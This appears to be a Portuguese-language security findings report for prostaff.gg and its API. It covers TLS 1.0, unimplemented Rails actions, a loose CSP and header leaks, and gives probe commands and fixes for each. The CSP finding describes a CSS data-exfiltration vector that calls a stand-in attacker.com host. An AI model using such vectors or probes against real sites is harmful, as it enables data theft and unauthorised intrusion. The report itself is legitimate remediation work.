# Findings exploráveis — prostaff.gg / api.prostaff.gg
**Data:** 2026-10-21  
**Fontes:** AnarCry scan (08:17) + OWASP ZAP log (05:47)

---

## [HIGH] TLSv1 habilitado no servidor

**Target:** prostaff.gg:443  
**Módulo:** TLS (AnarCry)  
**Exploração:** Handshake TLS 1.0 negociado com sucesso. Permite ataques BEAST e POODLE contra sessões de clientes que suportem TLS 1.0. Em cenários de MITM na rede do cliente, um atacante pode forçar downgrade e descriptografar tráfego.

```
openssl s_client -connect prostaff.gg:443 -tls1
```

**Fix:** Desabilitar TLS 1.0 e TLS 1.1 no painel Cloudflare → SSL/TLS → Edge Certificates → Minimum TLS Version → TLS 1.2.

---

## [MEDIUM] WaitlistController não implementado — 500 em rota pública

**Target:** api.prostaff.gg  
**Fonte:** ZAP log — `ActionDispatch::MissingController (uninitialized constant Core::Controllers::WaitlistController)`  
**Exploração:** Qualquer request para a rota de waitlist retorna 500 com stack trace exposto nos logs. Dependendo do middleware de erro, pode vazar informações internas. Causa DoS funcional nessa rota — um atacante pode lopar requests para poluir logs/alertas.

```
curl https://api.prostaff.gg/api/v1/waitlist
```

**Fix:** Implementar `Core::Controllers::WaitlistController` ou remover a rota do `routes.rb`.

---

## [MEDIUM] Action `destroy` ausente em TicketsController — 500

**Target:** api.prostaff.gg  
**Fonte:** ZAP log — `AbstractController::ActionNotFound (The action 'destroy' could not be found for Support::Controllers::TicketsController)`  
**Exploração:** `DELETE /api/v1/support/tickets/:id` retorna 500. Rota existe mas action não foi implementada — erro não tratado. Pode expor stack trace.

```
curl -X DELETE https://api.prostaff.gg/api/v1/support/tickets/1
```

**Fix:** Implementar `destroy` em `Support::Controllers::TicketsController` ou remover a rota.

---

## [MEDIUM] `DataDragonService#map_url` não implementado — erro silencioso

**Target:** api.prostaff.gg  
**Fonte:** ZAP log — `Failed to fetch map assets: undefined method 'map_url' for class DataDragonService` (retornou HTTP 200)  
**Exploração:** `GET /api/v1/strategy/assets/map` retorna 200 mas com erro interno silenciado. O erro é swallowed pelo controller — resposta provavelmente vazia/incorreta. Pode causar comportamento inesperado em clientes que dependem desse endpoint.

**Fix:** Implementar `DataDragonService#map_url` ou propagar o erro corretamente (retornar 503/500 explícito).

---

## [LOW] Rotas inexistentes retornam RoutingError não tratado

**Target:** api.prostaff.gg  
**Fonte:** ZAP log

| Rota | Erro |
|------|------|
| `GET /api/v1/competitive-matches` | `RoutingError: No route matches` |
| `GET /api/v1/riot-integration/sync-status` | `RoutingError: No route matches` |

**Exploração:** Baixo risco individual, mas expõe que rotas foram removidas/renomeadas sem atualizar clientes. Em produção, RoutingErrors não tratados podem vazar informação da estrutura interna nos headers de resposta.

**Fix:** Adicionar as rotas corretas ou garantir que o handler de 404 genérico cobre esses casos sem expor stack info.

---

## [LOW] CSP style-src contém unsafe-inline

**Target:** https://prostaff.gg  
**Módulo:** Headers (AnarCry)  
**Exploração:** `unsafe-inline` em `style-src` permite CSS injection. Vetor: clickjacking visual e exfiltração de dados via `background: url(https://attacker.com/?data=...)` em inputs. Limitado — não permite XSS de script.

```
curl -sI https://prostaff.gg | grep -i content-security-policy
```

**Fix:** Substituir `unsafe-inline` por nonces ou hashes para estilos inline legítimos:
```
style-src 'self' 'nonce-<valor>' 'sha256-<hash>'
```

---

## [LOW] X-Powered-By expõe stack: Next.js

**Target:** https://prostaff.gg  
**Módulo:** Headers (AnarCry)  
**Exploração:** Facilita ataques direcionados a vulnerabilidades de versão específica do Next.js. Em combinação com outras informações, reduz o esforço de reconhecimento do atacante.

**Fix:** Adicionar em `next.config.js`:
```js
headers: async () => [{
  source: '/(.*)',
  headers: [{ key: 'X-Powered-By', value: '' }]
}]
```
Ou via `poweredByHeader: false` em `next.config.js`.

---

## [INFO] Endpoints públicos sem autenticação

**Target:** api.prostaff.gg  
**Fonte:** ZAP log — retornaram HTTP 200 sem token

| Endpoint | Response |
|----------|----------|
| `GET /api/v1/constants` | 200 |
| `GET /api/v1/riot-data/champions` | 200 |

**Observação:** Provavelmente intencional (dados públicos do jogo). Verificar se algum campo retornado não deveria ser público (ex: configurações internas, feature flags, IDs de usuário).

**Ação:** Revisar o payload retornado e confirmar que não há dados sensíveis nesses endpoints.

---

## Resumo de prioridade

| Prioridade | Item | Esforço |
|-----------|------|---------|
| 1 | TLSv1 habilitado | Baixo — 1 clique no Cloudflare |
| 2 | WaitlistController não implementado | Médio — implementar ou remover rota |
| 3 | TicketsController#destroy ausente | Baixo — implementar action |
| 4 | DataDragonService#map_url silenciado | Médio — implementar método |
| 5 | CSP style-src unsafe-inline | Médio — gerar nonces para estilos |
| 6 | X-Powered-By: Next.js | Baixo — config flag |
| 7 | Rotas RoutingError | Baixo — limpar routes.rb |
| 8 | Endpoints públicos | Baixo — revisar payload |
